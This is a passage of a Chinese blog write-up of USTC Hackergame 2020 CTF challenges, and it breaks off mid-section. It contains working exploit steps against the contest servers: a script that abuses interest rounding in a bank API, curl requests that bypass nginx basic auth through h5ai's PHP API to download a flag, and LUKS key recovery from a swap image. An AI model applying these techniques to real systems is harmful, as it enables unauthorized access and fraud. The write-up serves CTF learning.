16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img 